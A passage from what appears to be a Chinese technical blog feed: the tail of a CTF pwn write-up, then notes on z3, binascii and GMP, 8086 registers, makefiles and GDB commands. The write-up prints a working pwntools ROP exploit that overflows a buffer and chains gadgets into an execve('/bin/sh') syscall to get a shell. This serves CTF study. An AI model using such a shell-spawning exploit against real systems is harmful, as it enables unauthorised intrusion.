src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223656235.png" alt="image-20230813223656235" style="zoom:50%;" /><p>而且实际编写脚本也能发现0x20的输入长度根本不足以溢出到覆盖所谓canary的开头的00字节:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223739191.png" alt="image-20230813223739191" style="zoom:50%;" /><p>所以实际上就是个常规溢出,这里是syscall的getshell方式,而且题目中已经存在’/bin/sh’了…</p><p>本来这个题原本是用字符串溢出来泄露canary的…但是被某大佬patch掉了…orz</p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26428)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./canary1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall</span></span><br><span class="line">string = <span class="string">&#x27;what do you want to say:\n&#x27;</span></span><br><span class="line">paddings = <span class="number">0x28</span></span><br><span class="line">bin_sh_addr = <span class="number">0x000000006b90f0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里注意64位传参的前三个参数依次为rdi,rsi,rdx</span></span><br><span class="line">pop_rax_ret_addr = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret_addr = <span class="number">0x0000000000410183</span></span><br><span class="line">pop_rdx_ret_addr = <span class="number">0x000000000044b5c6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要使用syscall而不是x86的int_0x80</span></span><br><span class="line"><span class="comment"># 使用ROPgadget --binary canary1 --only syscall查找得到</span></span><br><span class="line"><span class="comment"># int_0x80_addr = 0x0000000000417f2f</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004012fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意此题为64位，系统调用和32位不同，所以不能使用11的方法，这里使用0x3b(59)</span></span><br><span class="line"><span class="comment"># 其他的基本一致</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * paddings + p64(pop_rax_ret_addr) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(pop_rsi_ret_addr) + p64(<span class="number">0</span>) + p64(pop_rdx_ret_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;How to bypass canary:  \n&quot;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(string, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223307551.png" alt="image-20230813223307551"></p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> NX </tag>
            
            <tag> mprotect </tag>
            
            <tag> rop </tag>
            
            <tag> syscall </tag>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用算法库</title>
      <link href="/2023e1a64ca7ff81/"/>
      <url>/2023e1a64ca7ff81/</url>
      
        <content type="html"><![CDATA[<h1 id="python">Python</h1><h2 id="ida-python">IDA Python</h2><p>顾名思义,在IDA中写python脚本,用来提取数据等</p><p>用到idc_bc695这个库</p><p>另见:</p><p>​<a href="https://www.cnblogs.com/iBinary/p/14642662.html">https://www.cnblogs.com/iBinary/p/14642662.html</a></p><p>​<a href="https://blog.csdn.net/m0_52164435/article/details/124878537">https://blog.csdn.net/m0_52164435/article/details/124878537</a></p><h2 id="数学库">数学库</h2><h3 id="z3库">z3库</h3><h4 id="安装">安装</h4><p>需要使用python3(python2已不再受支持,安装很可能出现问题)来安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install z3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面命令失败的话可以尝试</span></span><br><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><h4 id="声明求解范围">声明求解范围</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Int()和Ints()函数用于申请整数解</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有理数解</span></span><br><span class="line">a = Real(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">a, b = Reals(<span class="string">&quot;a b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位向量，用于求解与/或/移位等位运算</span></span><br><span class="line"><span class="comment"># 第二个参数表示位数</span></span><br><span class="line">a = BitVec(<span class="string">&quot;a&quot;</span>, <span class="number">8</span>)</span><br><span class="line">a, b = BitVecs(<span class="string">&quot;a b&quot;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure><h4 id="增加方程约束">增加方程约束</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立求解器</span></span><br><span class="line">S=Solver()</span><br><span class="line"><span class="comment">#添加约束</span></span><br><span class="line">equs=[</span><br><span class="line">    a+b==<span class="number">10</span>,</span><br><span class="line">    a-b==<span class="number">6</span></span><br><span class="line">]</span><br><span class="line">S.add(equs)</span><br><span class="line"><span class="comment">#也可以一个一个加</span></span><br><span class="line">S.add(a+b==<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="求解">求解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(s.check())   <span class="comment"># sat代表有解，unsat代表无解</span></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><h2 id="数据处理库">数据处理库</h2><h3 id="二进制-字符处理-binascii">二进制-字符处理—binascii</h3><p>参阅https://blog.csdn.net/asmartkiller/article/details/114704320</p><p>主要用于二进制和ASCII互相转换</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922171158471.png" alt="image-20230922171158471"></p><p>转为二进制数据bin_var后,如果进一步转为字符串,那么进行<code>bin_var.decode()</code>即可</p><p>例如<code>（SUCTF2019）SignIn</code>中使用<code>binascii.unhexlify()</code>方法将生成的十六进制字符串转为字符串</p><h4 id="例题">例题</h4><p>见[<a href="https://www.ctfer.vip/problem/403">SWPUCTF 2021 新生赛]简简单单的逻辑</a></p><p>使用int.from_bytes()方法进行字节流转为int的操作,同时需要指定大小端序</p><p>解密脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(len(list)):</span></span><br><span class="line"><span class="comment">#     key = (list[i]&gt;&gt;4)+((list[i] &amp; 0xf)&lt;&lt;4)</span></span><br><span class="line"><span class="comment">#     result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(len(list)):</span></span><br><span class="line"><span class="comment">#     list[i] = (list[i] &gt;&gt; 4) + ((list[i] &amp; 0xf) &lt;&lt; 4)</span></span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">242</span>, <span class="number">168</span>, <span class="number">247</span>, <span class="number">147</span>, <span class="number">87</span>, <span class="number">203</span>, <span class="number">51</span>, <span class="number">248</span>, <span class="number">17</span>, <span class="number">69</span>, <span class="number">162</span>, <span class="number">120</span>, <span class="number">196</span>, <span class="number">150</span>, <span class="number">193</span>, <span class="number">154</span>, <span class="number">145</span>]</span><br><span class="line">result = <span class="string">&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(result):</span><br><span class="line">    <span class="comment"># print(int.from_bytes(binascii.unhexlify((result[i] + result[i + 1])), byteorder=&#x27;little&#x27;))</span></span><br><span class="line">    enc = <span class="built_in">int</span>.from_bytes(binascii.unhexlify((result[i] + result[i + <span class="number">1</span>])), byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># 这里用到了int.from_bytes方法</span></span><br><span class="line">    <span class="comment"># print(binascii.unhexlify((result[i] + result[i + 1])))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc^<span class="built_in">list</span>[i//<span class="number">2</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="c语言">C语言</h1><h2 id="高精度-gmp库">高精度—GMP库</h2><p>GMP(The GNU Multiple Precision Arithmetic Library)又叫GNU多精度算术库，是一个提供了很多操作高精度的大整数，浮点数的运算的算术库，几乎没有什么精度方面的限制，功能丰富。我刚接触到这个东西的时候是在学习PHP的过程中。GMP的主要目标应用领域是密码学的应用和研究、 互联网安全应用、 代数系统、 计算代数研究等。</p><h3 id="gmpz-init-set-str-函数">__gmpz_init_set_str() 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mpz_init_set_str</span> <span class="params">(<span class="type">mpz_t</span> rop, <span class="type">char</span> *str, <span class="type">int</span> base)</span></span><br></pre></td></tr></table></figure><p>将str字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存</p><h3 id="gmpz-powm-函数">__gmpz_powm() 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __gmpz_powm(<span class="type">mpz_t</span> rop, <span class="type">const</span> <span class="type">mpz_t</span> base, <span class="type">const</span> <span class="type">mpz_t</span> <span class="built_in">exp</span>, <span class="type">const</span> <span class="type">mpz_t</span> mod)</span><br></pre></td></tr></table></figure><p>将base求exp次幂,然后对mod求模,最后把结果存到rop中(可以用于编写RSA)</p><p>其他函数见文档</p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编学习笔记1---寄存器</title>
      <link href="/20235933f1aa9e05/"/>
      <url>/20235933f1aa9e05/</url>
      
        <content type="html"><![CDATA[<h1 id="8086寄存器">8086寄存器</h1><p>不同CPU的寄存器个数结构不同,对于8086CPU,有14个寄存器,分为:</p><p>​AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><h1 id="通用寄存器">通用寄存器</h1><p>在x86架构的汇编语言中ax,bx,cx,dx是通用寄存器,用于存储数据或进行算术运算。这些寄存器的功能区别如下：</p><ol><li>AX (Accumulator): AX寄存器是累加器寄存器,用于执行算术和逻辑操作,以及存放函数返回值。在乘法和除法运算中,AX寄存器存储乘法的结果或除法的被除数。</li><li>BX (Base Register): BX寄存器通常用作基址寄存器,用于存放内存访问中的偏移地址。在一些特殊情况下,BX也可以用作通用寄存器。</li><li>CX (Count Register): CX寄存器通常用作计数器,特别是在循环操作中。它可以作为循环的计数值,并在循环执行过程中递减。</li><li>DX (Data Register): DX寄存器常用于存放一些数据,例如乘法的乘数或除法的除数。</li></ol><p>8086的寄存器均为16位,一个16位寄存器又可分为两部分,即kH,kL(k为A,B,C,D),各为一个字节(2字节/16位为一个字)</p><h2 id="ax寄存器">AX寄存器</h2><p>​AX寄存器一般用来存储临时数据,存储函数返回值,存储控制信息等,所以经常被用于MOV指令</p><h2 id="bx寄存器">BX寄存器</h2><p>​BX寄存器通常用于内存寻址,即用于存储内存地址或作为其他寄存器的间接寻址寄存器</p><p>​例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV BX, 2000h    ; 将数据2000h传送到BX寄存器，作为内存地址</span><br><span class="line">MOV AX, [BX]     ; 将BX寄存器中存储的地址所对应的内存数据传送到AX寄存器</span><br><span class="line">MOV [BX], CX     ; 将CX寄存器的值传送到BX所指向的内存地址</span><br></pre></td></tr></table></figure><h2 id="cx寄存器">CX寄存器</h2><p>​CX寄存器常用于计数器,用来在循环中(Loop)计数和存储计数值</p><p>​Loop &lt;标号&gt;命令执行时,会进行两步操作:</p><p>​1.(cx)=(cx)-1;</p><p>​2.判断cx是否为0,如果为0则向下执行,否则跳转至标号处执行程序]</p><h2 id="dx寄存器">DX寄存器</h2><p>​DX常用于存储数据或者作为数据传输的缓冲区,例如存储循环累加的值</p><h1 id="段寄存器">段寄存器</h1><p>​在 8086 处理器中，共有四个段寄存器，它们是 CS (Code Segment)、DS (Data Segment)、SS (Stack Segment) 和 ES (Extra Segment),各个段寄存器的功能如下:</p><ol><li>CS (Code Segment)：指向代码段的起始地址，用于存储程序代码的位置。CS 寄存器中的内容加上指令的偏移地址，形成实际的物理地址，从而取得代码段中的指令。</li><li>DS (Data Segment)：指向数据段的起始地址，用于存储程序的全局数据和静态数据。DS 寄存器中的内容加上数据的偏移地址，形成实际的物理地址，从而访问数据段中的数据。</li><li>SS (Stack Segment)：指向栈段的起始地址，用于存储程序的运行时栈。SS 寄存器中的内容加上栈中数据的偏移地址，形成实际的物理地址，从而操作栈中的数据。</li><li>ES (Extra Segment)：额外段寄存器，用于存储其他数据段的起始地址。在特定情况下，程序可以使用 ES 寄存器来访问额外的数据段。</li></ol><p>参阅:</p><p>​<a href="https://blog.csdn.net/tju_zxl/article/details/128766360">https://blog.csdn.net/tju_zxl/article/details/128766360</a></p>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> 寄存器 </tag>
            
            <tag> 8086 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>makefile的使用</title>
      <link href="/20238c1bed83c499/"/>
      <url>/20238c1bed83c499/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile基本规则">makefile基本规则</h1><h2 id="一-格式">一.格式:</h2><p><strong>Target</strong> : Dependencies…</p><p>Command…</p><p>这即为一个规则,其中:</p><ol><li><p>Target 为目标,是规则的名字,也是make命令的入口.</p><p>Target可以是目标文件—main.o main等等</p><p>也可以是伪目标—并非真正要生成的文件,而是一个标签,不要和实际要生成的文件同名,一般为一个有意义的名字,可以描述其下Command命令功能的名字</p><p>Target中一般只有一个文件;多个文件用空格分开,但是必须为相同类型的文件</p></li><li><p><strong>Dependencies</strong>为依赖文件列表</p><p>例如main依赖main.o和hello.o,即为:</p><p>main:main.o hello.o</p><p>如果依赖文件一个都不写的话,那么只要输入make命令command命令就会执行</p><p>一般都将生成可执行文件的规则放在第一个,如下(?):</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190209136.png" alt="image-20230729190209136" style="zoom:33%;" /><p>如果不想将命令显示出来,在每条Command命令前都加上@即可:</p></li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190236956.png" alt="image-20230729190236956" style="zoom:33%;" /><h2 id="二-自动化变量">二.自动化变量</h2><ol><li>每一条规则都有互不冲突的变量:</li></ol><table><thead><tr><th>$&lt;</th><th>规则的第一个依赖文件名</th></tr></thead><tbody><tr><td>$^</td><td>规则的所有依赖文件列表</td></tr><tr><td>$@</td><td>规则的目标文件名</td></tr></tbody></table><p>使用自动化变量可以简化规则的书写,例如:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190322189.png" alt="image-20230729190322189" style="zoom: 33%;" /><p><strong>注意:自动化变量只能用于Command中,不能用于每个规则的第一行</strong></p><ol start="2"><li>可以定义变量替代一系列文件名:</li></ol><p>targets=main.o add.o sub.o</p><p>该变量相当于全局变量,可以用在任何出现main.o add.o sub.o的地方</p><p>但是使用的时候写法为$(targets)而不能直接使用targets</p><p>一般只需要定义如下变量放于开头:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190425899.png" alt="image-20230729190425899" style="zoom:33%;" /><p>分别为:最后可执行文件的变量;生成该可执行文件所需要的所有.o文件的变量;所有头文件的变量</p><h1 id="makefile的简化">makefile的简化</h1><p>一.%.o:%.c</p><p>观察下面规则:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190520197.png" alt="image-20230729190520197" style="zoom:33%;" /><p>可以使用</p><p>%.o:%.c</p><p>gcc -c $&lt; -o $@</p><p>来简化</p><p>%.o代表所有的.o文件,%.c代表所有的.c文件</p><p><strong>注意</strong>:尽管写在了一起,但是仍然是&quot;只有发生改变的文件以及与该文件有依赖关系的文件才会重新编译&quot;</p><h1 id="makefile隐含规则">makefile隐含规则</h1><p>隐含规则是系统在makefile中已经写好的,隐含的一些规则</p><ol><li>将.c文件编译生成.o文件</li></ol><p>make会自动推导出这种规则,并生成.o文件</p><p>所以前面的规则可以写成:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190606717.png" alt="image-20230729190606717" style="zoom:33%;" /><h1 id="存在多个makefile文件时执行哪一个">存在多个makefile文件时执行哪一个</h1><ol><li>make命令能够找到的makeflie文件只能是makefile或Makefile</li></ol><p>其他名字需要使用-f参数,例如:</p><p>make -f makefile1</p><p>make clean -f makefile1</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190646494.png" alt="image-20230729190646494" style="zoom:25%;" />]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB调试的使用</title>
      <link href="/2023c0fbb9744b11/"/>
      <url>/2023c0fbb9744b11/</url>
      
        <content type="html"><![CDATA[<h1 id="gdb概述">GDB概述</h1><h2 id="gdb组成架构">GDB组成架构</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/241-s2r1grmfpvr.png" alt="img" style="zoom:50%;" /><h2 id="基本工作原理">基本工作原理</h2><p>gdb 通过系统调用 <code>ptrace</code> 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。</p><h3 id="三种调试方式">三种调试方式</h3><p>​直接运行并调试一个新进程</p><p>​运行并调试一个新进程</p><p>​运行 gdb，通过命令行或 <code>file</code> 命令指定目标程序。</p><p>​输入<code>run</code>命令， gdb 执行下面的操作：</p><p>​通过 <code>fork()</code> 系统调用创建一个新进程</p><p>​在新创建的子进程中执行操作：<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code></p><p>​在子进程中通过 <code>execv()</code> 系统调用加载用户指定的可执行文件</p><p>​attach并调试一个已经运行的进程</p><p>​用户确定需要进行调试的进程 PID</p><p>​运行 gdb，输入 <code>attach &lt;pid&gt;</code>，gdb 将对指定进程执行操作：<code>ptrace(PTRACE_ATTACH, pid, 0, 0)</code></p><p>​远程调试目标机上新创建的进程</p><p>​gdb 运行在调试机上，gdbserver 运行在目标机上，两者之间的通信数据格式由 gdb 远程串行协议（Remote Serial Protocol）定义</p><p>​RSP 协议数据的基本格式为： <code>$..........#xx</code></p><p>​gdbserver 的启动方式相当于运行并调试一个新创建的进程</p><h1 id="使用gdb前的准备">使用GDB前的准备</h1><p>编译</p><p>​一般关闭-o优化选项</p><p>​打开-g调试选项</p><p>​-Wall打开所有warning</p><h1 id="gdb启动-退出-查看代码命令">GDB启动/退出/查看代码命令</h1><p>启动退出</p><p>​gdb 可执行文件 —启动调试</p><p>​quit/ctrl+d —退出</p><p>设置参数/获取设置参数</p><p>​set args 10 20</p><p>​show args</p><p>GDB使用帮助</p><p>​help</p><p>查看当前文件代码</p><p>​list/l —从默认位置显示</p><p>​list/l &lt;行号&gt; —从制定的行显示</p><p>​list/l &lt;函数名&gt; —从指定的函数开始显示</p><p>​disassemble/disas —反汇编命令</p><p>​<code>disas &lt;func&gt;</code> 反汇编指定函数</p><p>​<code>disas &lt;addr&gt;</code> 反汇编某地址所在函数</p><p>​<code>disas &lt;begin_addr&gt; &lt;end_addr&gt;</code> 反汇编从开始地址到结束地址的部分</p><p>查看非当前文件代码</p><p>​list/l &lt;文件名:行号&gt;</p><p>​list/l &lt;文件名:函数名&gt;</p><p>设置显示的行数</p><p>​show list/listsize</p><p>​set list/listsize &lt;行数&gt;</p><p>其他</p><p>​pwd —显示工作目录</p><p>​shell —不离开gdb就能运行shell命令</p><p>​directory/dir —设置查找源文件的路径(或者gdb的-d参数)</p><h1 id="gdb断点命令">GDB断点命令</h1><p>设置断点</p><p>​b/break &lt;行号&gt;</p><p>​b/break &lt;函数名&gt;</p><p>​b/break &lt;文件名:行号&gt;</p><p>​b/break &lt;文件名:函数名&gt;</p><hr><p>​tbreak —临时断点,如同break,只不过在一次命中后被删除</p><p>查看断点</p><p>​i/info b/break</p><p>删除断点</p><p>​d/del/delete 断点编号</p><p>设置断点无效</p><p>​dis/disable 断点编号</p><p>设置断点生效</p><p>​ena/enable 断点编号</p><p>设置条件断点</p><p>​b/break 10 if i==5</p><h1 id="gdb调试运行命令">GDB调试运行命令</h1><p>运行GDB</p><p>​start —停止于第一行</p><p>​run —运行到下一个断点</p><p>继续运行到下一个断点</p><p>​c/continue</p><p>向下执行一段代码(不会进入函数体)</p><p>​n/next</p><p>向下单步调试(遇到函数步进)</p><p>​s/step —步进</p><p>​finish —运行直至跳出函数体</p><p>反向步进程序</p><p>​reverse-step [n] —反向步进程序,直到到达另一个源码行的开头,n表示执行n次,或某种原因程序停止</p><p>变量操作</p><p>​p/print 变量名 —打印值</p><p>​ptype 变量名 —打印类型</p><p>自动变量操作</p><p>​display num —自动打印指定变量的值</p><p>​undisplay —取消…</p><p>​i/info display</p><p>​undisplay 编号</p><p>其他操作</p><p>​until —跳出循环</p><p>​until &lt;行号&gt; —在函数内，进行指定位置跳转，执行完区间代码</p><h1 id="表达式监视-修改命令">表达式监视/修改命令</h1><p>print &lt;表达式&gt; —对任意正确的表达式进行求值并打印</p><p>display &lt;表达式&gt; —每次单步进行指令后,紧接着输出被设置的表达式及值(单步运行非常有用)</p><p>watch &lt;表达式&gt; —设置一个监视点,一旦被监视的&quot;表达式&quot;的值改变,gdb将强行终止正在被调试的程序</p><p>​另外 <code>rwatch</code> 表示在访问时停止，<code>awatch</code> 表示在访问和改变时都停止</p><p>whatis —查询变量或函数</p><p>info &lt;函数&gt; —查询函数</p><p>info locals —查看当前堆栈页所有的变量</p><p>set var 变量名=变量值 —修改变量的值</p><h1 id="特殊执行命令">特殊执行命令</h1><p>运行代码</p><p>​call 函数(参数) —调用和执行函数</p><p>​return <expression> —取消函数调用的执行,expression被当做函数的返回值</p><p>生成代码</p><p>​make —不退出gdb就能重新产生可执行文件</p><h1 id="内存查看命令">内存查看命令</h1><table><thead><tr><th>命令</th><th style="text-align:left">子选项</th><th>解释</th></tr></thead><tbody><tr><td>x</td><td style="text-align:left">x/3 内存地址</td><td>需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义</td></tr><tr><td></td><td style="text-align:left">x/f 内存地址</td><td>f 表示显示的格式 ：  x 按十六进制格式显示变量。  d 按十进制格式显示变量。   u 按十进制格式显示无符号整型。   o 按八进制格式显示变量。   t 按二进制格式显示变量。   a 按十六进制格式显示变量。   i 指令地址格式   c 按字符格式显示变量。   f 按浮点数格式显示变量。</td></tr><tr><td></td><td style="text-align:left">x/u 内存地址</td><td>u表示一个地址单元的长度    b表示单字节，    h表示双字节，    w表示四字节，    g表示八字节</td></tr><tr><td>举例</td><td style="text-align:left">x /3dw 内存地址</td><td>打印3个四字节，按照10进制格式打印(即将上面各个部分组合起来)</td></tr></tbody></table><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729165808207.png" alt="image-20230729165808207"></p><p>这里打印了str[0]~str[15]的所有值(以16进制)</p><p>另外,使用 $ida(“xxx”)可以通过IDA名称获取地址,例如 $ida(“main”)  (?)</p><h1 id="堆栈和寄存器处理命令">堆栈和寄存器处理命令</h1><p>bt —查看当前函数调用栈,即当前函数调用的上一层函数以及它们的调用栈信息</p><p>up/down n —在堆栈中向上/向下移动n层</p><p>frame n —切换到第n层堆栈</p><p>info相关的命令</p><p>​info frame —查看当前堆栈帧的信息，包括函数名、参数、返回地址等</p><p>​info args —查看当前函数的参数信息</p><p>​info locals —查看当前函数的局部变量信息</p><p>​info registers —查看所有寄存器的信息</p><p>print /x $reg —以16进制格式查看指定寄存器reg的值</p><p>set $reg = value —设置指定寄存器reg的值为value</p><h1 id="查询运行状态命令">查询运行状态命令</h1><p>where/bt —当前运行的堆栈列表(?)/查看程序出错原因</p><p>bt backtrace —显示当前调用堆栈</p><p>up/down —改变堆栈显示的深度</p><p>info program —查看程序的是否在运行，进程号，被暂停的原因</p><h1 id="注意">注意</h1><p>1.GDB不会自动在程序入口点暂停,所以需要在执行前设置好断点</p><p>部分转载于:</p><p><a href="https://www.wenjiangs.com/doc/lkor5lfsdn#gdb-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"></a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GDB </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第二周</title>
      <link href="/2023b008bf7590af/"/>
      <url>/2023b008bf7590af/</url>
      
